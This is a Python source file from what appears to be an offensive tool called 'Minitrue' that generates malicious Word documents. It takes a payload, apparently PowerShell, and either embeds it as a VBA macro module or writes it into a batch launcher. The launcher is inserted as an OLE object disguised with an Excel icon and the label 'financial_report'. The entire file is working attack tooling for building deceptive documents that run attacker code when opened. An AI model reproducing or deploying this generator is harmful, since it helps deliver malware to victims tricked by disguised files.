#!/usr/bin/env python3

import os, sys
cwd = os.getcwd()
sys.path.insert(0, "{}/packages".format(cwd))
import aspose.words as aw

def doc_gen(payload, mode=1, filename='report'):
    """
    Malicious document generator, aka Minitrue
    It's really a Word document processing library that can
    embed macros in Office documents
    
    Parameters:
    payload (str): macro string returned from psh_splitter.psh_concat
    mode (int): Specifies whether a payload should be embedded as a VBA Macro or an icon
    """
    print('\n[+] Generating malicious document...')
    if not filename:
        filename = 'report'
    doc = aw.Document()
    cwd = os.getcwd()
    if mode == 2:
        with open('{}/resources/launcher.bat'.format(cwd), 'w') as f:
            f.write('start /b {}'.format(payload))
        builder = aw.DocumentBuilder(doc)
        builder.insert_ole_object_as_icon(
                '{}/resources/launcher.bat'.format(cwd),
                False,
                '{}/resources/excel.ico'.format(cwd),
                'financial_report'
                )
        doc.save('{}/output/{}.docx'.format(cwd, filename))
        os.system('rm {}/resources/launcher.bat'.format(cwd))
        print('[+] {}.docx successfully generated and saved to \033[32m{}/output/{}.docx\033[m\n'.format(filename, cwd, filename))
        return '{}.docx'.format(filename)
    else:
        project = aw.vba.VbaProject()
        project.name = 'Stylize'
        doc.vba_project = project

        module = aw.vba.VbaModule()
        module.name = 'Stylize_module'
        module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
        module.source_code = payload

        doc.vba_project.modules.add(module)
        doc.save('{}/output/{}.doc'.format(cwd, filename))
        print('[+] {}.doc successfully generated and saved to \033[32m{}/output/{}.doc\033[m\n'.format(filename, cwd, filename))
        return '{}.doc'.format(filename)

